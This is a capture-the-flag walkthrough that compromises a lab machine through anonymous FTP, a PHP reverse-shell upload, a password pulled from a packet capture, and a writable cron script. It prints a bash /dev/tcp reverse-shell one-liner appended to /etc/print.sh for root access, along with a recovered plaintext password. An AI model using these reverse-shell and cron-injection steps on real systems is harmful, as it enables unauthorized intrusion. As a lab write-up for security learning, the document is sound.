---
sticker: emoji//1f336-fe0f
---
# ENUMERATION



## OPEN PORTS

Let's begin with a simple Nmap scan:

![](../images/Pasted%20image%2020241023164431.png)

```ad-hint
OPEN PORTS:

- 21: ftp (Anonymous login allowed)
- 22: ssh
- 80: http
```

Let's log in FTP since anonymous login is allowed:

![](../images/Pasted%20image%2020241023164907.png)

We found this files, let's download them all using `mget *`

Let's read `notice.txt`:

![](../images/Pasted%20image%2020241023165101.png)

Seems like `maya` could be an user for ssh

If we try to use `steghide` in the important.jpg we get this:

![](../images/Pasted%20image%2020241023165247.png)
Let's try to change the hex for the file into a jpg, and try again:

![](../images/Pasted%20image%2020241023165422.png)
![](../images/Pasted%20image%2020241023165648.png)

Couldn't get anything useful, so, let's start with the web fuzzing and enumeration
## FUZZING

Using FFUF to fuzz the website, I found this directory:

![](../images/Pasted%20image%2020241023164544.png)

Let's visit the website and try to enumerate it further: 

![](../images/Pasted%20image%2020241023165753.png)
## SOURCE CODE

![](../images/Pasted%20image%2020241023165822.png)
# EXPLOITATION


## FILES DIRECTORY

![](../images/Pasted%20image%2020241023165853.png)

Seems like we could exploit the ftp to upload files into the server, we could try uploading a [[MOST COMMON REVERSE SHELLS|reverse shell]] for this CTF, I uploaded a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):



![](../images/Pasted%20image%2020241023174700.png)

Nice, let's send the reverse shell and get our connection:


![](../images/Pasted%20image%2020241023174758.png)

Once I established the connection, I stabilized my shell using the [[STABLE SHELL|stable shell tricks]]

![](../images/Pasted%20image%2020241023174947.png)

Nice, now we have an stable shell, let's get our flags and escalate privileges.


# PRIVILEGE ESCALATION

Before trying to escalate privileges, we are able to read the recipe.txt file and it says this:

![](../images/Pasted%20image%2020241023175629.png)

So, we got our first answer, let's try to read the home directory:

![](../images/Pasted%20image%2020241023175658.png)


If we try to `cd` to Lennie home, permission is denied, but now, we can try other escalation vectors, for example, if we use linpeas, we are able to see we have 2 suspicious folder in root:

```ad-note
[+] Unexpected folders in root 
/incidents /data
```

Let's read the contents of both files:

![](../images/Pasted%20image%2020241023180403.png)

We got a `.pcapng` file, we can analyze it with wireshark, let's copy it to `/var/www/html/files/ftp` and download it to our machine:

![](../images/Pasted%20image%2020241023180944.png)
![](../images/Pasted%20image%2020241023180951.png)


Now that we filtered tcp in wireshark, we can follow the tcp stream for the following:

![](../images/Pasted%20image%2020241023182634.png)

If we follow the stream, we are able to see this:

![](../images/Pasted%20image%2020241023182732.png)

Seems like we got the password for Lennie:

```ad-important
`lennie:c4ntg3t3n0ughsp1c3`
```

![](../images/Pasted%20image%2020241023182848.png)
We are in, now, we are able to read the `user.txt`

If we try `sudo -l`, lennie may not run sudo on startup, let's use the other techniques from [[BASIC PRIVESC IN LINUX|linux privesc]]

After trying all that, nothing useful came, but, in the lennie home, we found a useful directory called `/scripts` 
![](../images/Pasted%20image%2020241023183424.png)
I found a planner.sh and startup_list.txt, second file did not have anything useful, but first file, had this:


![](../images/Pasted%20image%2020241023183735.png)

A `/etc/print.sh` file, we can write on it, let's write a reverse shell on it:

```ad-important
shell: `echo "/bin/bash -i >& /dev/tcp/10.6.34.159/1234 0>&1" >> /etc/print.sh`
```

Since planner.sh runs every minute, we only need to wait a minute with out netcat set on to get the shell:

![](../images/Pasted%20image%2020241023184044.png)

And just like that, we finished the machine:

![](../images/Pasted%20image%2020241023184153.png)

Gg!

